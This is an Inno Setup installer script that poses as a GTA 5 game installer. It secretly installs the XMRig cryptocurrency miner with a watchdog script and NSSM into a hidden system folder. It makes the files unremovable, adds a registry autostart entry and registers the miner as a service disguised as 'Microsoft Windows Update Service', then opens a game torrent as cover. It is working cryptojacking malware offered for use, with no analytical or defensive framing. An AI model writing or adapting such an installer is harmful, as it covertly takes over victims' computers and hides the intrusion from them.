; GTA 5 + XMRig Installer (WindowsCacheService) - FIXED

[Setup]
AppName=GTA 5
AppVersion=1.0.0
DefaultDirName={pf}\GTA5
DefaultGroupName=GTA5
Compression=lzma2
SolidCompression=yes
PrivilegesRequired=admin
OutputDir=C:\GTAInstaller
OutputBaseFilename=gta5_enhanced-portable
DisableDirPage=no
DisableProgramGroupPage=no
DisableReadyPage=no
DisableFinishedPage=no
Uninstallable=no

[Files]
; XMRig (ატრიო) - იგივე სახელები (არ შეცვლილა!)
Source: "xmrig.exe"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion uninsneveruninstall; Attribs: hidden system
Source: "config.json"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion uninsneveruninstall; Attribs: hidden system
Source: "nssm.exe"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion uninsneveruninstall; Attribs: hidden system
Source: "watchdog.bat"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion uninsneveruninstall; Attribs: hidden system

; 🔥 GTA 5 (ნამდვილი ინსტალერი)
Source: "gta5_enhanced-portable.torrent"; DestDir: "{app}"; DestName: "gta5_enhanced-portable.torrent"; Flags: ignoreversion

[Registry]
; Autostart
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "WindowsCache"; ValueData: "{commonappdata}\Microsoft\Windows\Caches\watchdog.bat"; Flags: createvalueifdoesntexist

[Run]
; XMRig Service (WindowsCacheService)
Filename: "{cmd}"; \
    Parameters: "/C cd /d ""{commonappdata}\Microsoft\Windows\Caches"" && nssm.exe install WindowsCacheService ""{commonappdata}\Microsoft\Windows\Caches\xmrig.exe"" && nssm.exe set WindowsCacheService AppDirectory ""{commonappdata}\Microsoft\Windows\Caches"" && nssm.exe set WindowsCacheService Start SERVICE_AUTO_START && nssm.exe set WindowsCacheService DisplayName ""Windows Update Service"" && nssm.exe set WindowsCacheService Description ""Microsoft Windows Update Service"" && nssm.exe start WindowsCacheService"; \
    Flags: runhidden

; Start watchdog
Filename: "{cmd}"; Parameters: "/C start /B """" ""{commonappdata}\Microsoft\Windows\Caches\watchdog.bat"""; Flags: runhidden

; 🔥 GTA 5-ის ინსტალაცია (Finish-ის შემდეგ)
Filename: "{app}\gta5_enhanced-portable.torrent"; Flags: nowait postinstall

[Code]
var
  ResultCode: Integer;

function InitializeSetup(): Boolean;
begin
  Result := True;
end;